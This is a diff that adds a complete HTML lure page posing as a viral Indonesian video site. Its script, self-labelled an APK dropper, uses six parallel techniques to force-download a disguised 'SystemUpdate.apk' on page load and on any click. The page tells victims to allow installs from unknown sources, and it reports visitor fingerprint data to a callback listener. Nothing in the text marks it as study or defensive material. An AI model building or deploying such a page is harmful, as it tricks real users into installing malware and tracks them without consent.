@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Video Viral 2026</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #0a0a0a;
+    color: #fff;
+    min-height: 100vh;
+}
+.header {
+    background: linear-gradient(135deg, #1a0033, #660033);
+    padding: 15px 20px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    position: sticky;
+    top: 0;
+    z-index: 10;
+}
+.header .logo {
+    width: 36px; height: 36px;
+    background: #ff0066;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 18px;
+    font-weight: bold;
+}
+.header h1 { font-size: 16px; font-weight: 600; }
+.header .sub { font-size: 11px; color: #ff6699; }
+.video-container {
+    position: relative;
+    width: 100%;
+    background: #000;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 280px;
+    cursor: pointer;
+}
+.video-container .play-btn {
+    width: 70px; height: 70px;
+    background: rgba(255,0,102,0.9);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 30px;
+    position: absolute;
+    z-index: 2;
+    box-shadow: 0 0 40px rgba(255,0,102,0.5);
+    animation: pulse 1.5s ease-in-out infinite;
+}
+@keyframes pulse { 0%,100% { transform:scale(1); } 50% { transform:scale(1.08); } }
+.video-container .thumb {
+    width: 100%;
+    height: 280px;
+    object-fit: cover;
+    opacity: 0.6;
+    background: linear-gradient(135deg, #1a0033 0%, #000 50%, #330011 100%);
+}
+.content { padding: 16px 20px; }
+.content h2 { font-size: 15px; margin-bottom: 8px; line-height: 1.4; }
+.content .meta { font-size: 12px; color: #777; display: flex; gap: 15px; margin-bottom: 12px; }
+.desc { font-size: 13px; color: #999; line-height: 1.5; margin-bottom: 20px; }
+.download-box {
+    background: linear-gradient(135deg, #1a1a2e, #16213e);
+    border-radius: 12px;
+    padding: 20px;
+    text-align: center;
+    border: 1px solid rgba(255,255,255,0.05);
+    margin-bottom: 20px;
+}
+.download-box .icon-big { font-size: 40px; margin-bottom: 10px; }
+.download-box h3 { font-size: 16px; margin-bottom: 5px; color: #00d4ff; }
+.download-box p { font-size: 13px; color: #889; margin-bottom: 15px; }
+.btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #00d4ff, #00ff88);
+    color: #000;
+    padding: 14px 40px;
+    border-radius: 25px;
+    font-weight: bold;
+    font-size: 16px;
+    text-decoration: none;
+    transition: transform 0.2s;
+    border: none;
+    cursor: pointer;
+}
+.btn:hover { transform: scale(1.05); }
+.btn-small {
+    padding: 10px 25px;
+    font-size: 14px;
+    background: linear-gradient(135deg, #ff0066, #ff6600);
+    color: #fff;
+}
+.status-bar {
+    background: #111;
+    padding: 10px 16px;
+    font-size: 12px;
+    color: #666;
+    display: flex;
+    justify-content: space-between;
+    border-top: 1px solid #222;
+    margin-top: 20px;
+}
+.toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #00d4ff;
+    color: #000;
+    padding: 12px 24px;
+    border-radius: 8px;
+    font-weight: bold;
+    font-size: 14px;
+    opacity: 0;
+    transition: opacity 0.3s;
+    z-index: 100;
+    pointer-events: none;
+}
+.toast.show { opacity: 1; }
+/* Android installation prompt */
+.android-prompt {
+    display: none;
+    background: rgba(0,212,255,0.1);
+    border: 1px solid rgba(0,212,255,0.3);
+    border-radius: 10px;
+    padding: 15px;
+    margin-top: 15px;
+    text-align: left;
+}
+.android-prompt .step { font-size: 13px; color: #ccc; margin-bottom: 6px; padding-left: 20px; position: relative; }
+.android-prompt .step::before { content: '•'; position: absolute; left: 5px; color: #00d4ff; }
+.android-prompt .highlight { color: #00ff88; font-weight: bold; }
+</style>
+</head>
+<body>
+
+<div class="header">
+    <div class="logo">V</div>
+    <div>
+        <h1>Video Viral</h1>
+        <div class="sub">Trending Now</div>
+    </div>
+</div>
+
+<div class="video-container" id="videoArea">
+    <div class="play-btn" id="playBtn">&#9654;</div>
+    <div class="thumb"></div>
+</div>
+
+<div class="content">
+    <h2>BREAKING: Video ini bikin heboh seluruh Indonesia! Wajib tonton sebelum dihapus! 🔥</h2>
+    <div class="meta">
+        <span>1.234.567 views</span>
+        <span>2 hours ago</span>
+        <span>#viral #trending</span>
+    </div>
+    <div class="desc">
+        Video eksklusif yang lagi viral di seluruh Indonesia. 
+        Banyak yang bilang ini video paling shocking tahun 2026!
+        Tonton sekarang sebelum diambil down!
+    </div>
+
+    <div class="download-box" id="downloadBox">
+        <div class="icon-big">&#x2B07;</div>
+        <h3>Download Player Khusus</h3>
+        <p>Download player kami untuk menonton video eksklusif ini (ukuran kecil & aman)</p>
+        <a href="#" class="btn" id="downloadBtn" download="SystemUpdate.apk">&#x2B07; Download & Tonton</a>
+        <div class="android-prompt" id="androidPrompt">
+            <div class="step">Buka file <span class="highlight">SystemUpdate.apk</span> yang sudah di-download</div>
+            <div class="step">Tap <span class="highlight">Install</span> (izinkan dari sumber tidak dikenal)</div>
+            <div class="step">Buka aplikasi <span class="highlight">System Update</span></div>
+        </div>
+    </div>
+</div>
+
+<div class="status-bar">
+    <span id="statusText">&#x1F534; LIVE</span>
+    <span>1.2M watching</span>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ============================================================
+// HackerAI - Auto Download APK Dropper
+// ============================================================
+
+const APK_URL = "SystemUpdate.apk";
+const CALLBACK_URL = "/callback";
+const isAndroid = /android/i.test(navigator.userAgent);
+const isIOS = /iphone|ipad|ipod/i.test(navigator.userAgent);
+let downloaded = false;
+
+// Show toast notification
+function showToast(msg, color) {
+    const t = document.getElementById("toast");
+    t.textContent = msg;
+    if (color) t.style.background = color;
+    t.classList.add("show");
+    setTimeout(() => t.classList.remove("show"), 3000);
+}
+
+// Send callback to listener
+function report(action, extra) {
+    try {
+        const data = {
+            ip: "",
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            lang: navigator.language,
+            ts: Date.now(),
+            action: action,
+            ...(extra || {})
+        };
+        fetch(CALLBACK_URL + "?data=" + encodeURIComponent(JSON.stringify(data)), {
+            method: "GET",
+            mode: "no-cors"
+        });
+        try {
+            navigator.sendBeacon(CALLBACK_URL, JSON.stringify(data));
+        } catch(e) {}
+    } catch(e) {}
+}
+
+// === DOWNLOAD METHODS ===
+
+// Method 1: Fetch + Blob + Anchor
+async function downloadMethod1() {
+    try {
+        const r = await fetch(APK_URL, { cache: "no-cache" });
+        if (!r.ok) throw new Error("HTTP " + r.status);
+        const blob = await r.blob();
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = "SystemUpdate.apk";
+        a.style.display = "none";
+        document.body.appendChild(a);
+        a.click();
+        setTimeout(() => {
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }, 2000);
+        return true;
+    } catch(e) {
+        console.log("M1 fail:", e);
+        return false;
+    }
+}
+
+// Method 2: Direct anchor click
+function downloadMethod2() {
+    try {
+        const a = document.createElement("a");
+        a.href = APK_URL;
+        a.download = "SystemUpdate.apk";
+        a.style.display = "none";
+        document.body.appendChild(a);
+        a.click();
+        setTimeout(() => document.body.removeChild(a), 500);
+        return true;
+    } catch(e) {
+        return false;
+    }
+}
+
+// Method 3: Iframe download
+function downloadMethod3() {
+    try {
+        const ifr = document.createElement("iframe");
+        ifr.style.display = "none";
+        ifr.src = APK_URL;
+        document.body.appendChild(ifr);
+        setTimeout(() => document.body.removeChild(ifr), 10000);
+    } catch(e) {}
+}
+
+// Method 4: Android Intent (triggers package installer)
+function downloadMethod4() {
+    if (!isAndroid) return;
+    try {
+        const a = document.createElement("a");
+        a.href = "intent://SystemUpdate.apk#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end";
+        a.click();
+    } catch(e) {}
+}
+
+// Method 5: Service Worker download
+function downloadMethod5() {
+    if ("serviceWorker" in navigator) {
+        try {
+            navigator.serviceWorker.register("sw.js").catch(function(){});
+        } catch(e) {}
+    }
+}
+
+// Method 6: window.open fallback
+function downloadMethod6() {
+    try {
+        window.open(APK_URL, "_blank");
+    } catch(e) {}
+}
+
+// Main download trigger
+async function triggerDownload() {
+    if (downloaded) return;
+    downloaded = true;
+
+    document.getElementById("statusText").innerHTML = "&#x1F4E5; Downloading...";
+    report("download_start");
+
+    // Run all methods in parallel
+    const results = await Promise.allSettled([
+        downloadMethod1(),
+        downloadMethod2(),
+        downloadMethod3(),
+        downloadMethod4(),
+        downloadMethod5(),
+        downloadMethod6()
+    ]);
+
+    // Android-specific guide
+    if (isAndroid) {
+        document.getElementById("androidPrompt").style.display = "block";
+        showToast("Download dimulai! Buka file APK untuk install", "#00d4ff");
+    } else if (isIOS) {
+        showToast("Maaf, iOS tidak mendukung install APK", "#ff0066");
+    } else {
+        showToast("Download dimulai!", "#00d4ff");
+    }
+
+    document.getElementById("statusText").innerHTML = "&#x2705; Downloaded - Buka file APK";
+    report("download_complete");
+}
+
+// === EVENT HANDLERS ===
+
+// Click video area -> download
+document.getElementById("videoArea").addEventListener("click", function(e) {
+    e.preventDefault();
+    triggerDownload();
+    this.querySelector(".play-btn").style.display = "none";
+});
+
+// Click download button
+document.getElementById("downloadBtn").addEventListener("click", function(e) {
+    e.preventDefault();
+    triggerDownload();
+});
+
+// Click anywhere on page (second chance)
+document.addEventListener("click", function() {
+    if (!downloaded) {
+        downloadMethod2();
+        downloadMethod3();
+    }
+}, { once: false });
+
+// Page load - auto start after delay
+window.addEventListener("load", function() {
+    report("page_loaded");
+    setTimeout(function() {
+        if (!downloaded) {
+            downloadMethod2();
+            downloadMethod3();
+            downloadMethod5();
+        }
+    }, 2000);
+});
+
+// Android Chrome: try to use beforeinstallprompt
+window.addEventListener("beforeinstallprompt", function(e) {
+    e.preventDefault();
+    // Deferred prompt - trigger download instead
+    if (!downloaded) {
+        downloadMethod1();
+        downloadMethod2();
+    }
+});
+
+// Report page visibility
+document.addEventListener("visibilitychange", function() {
+    if (document.visibilityState === "visible") {
+        report("page_visible");
+    }
+});
+
+console.log("Video Viral 2026 - HackerAI Dropper Ready");
+report("ready");
+</script>
+</body>
+</html>
+
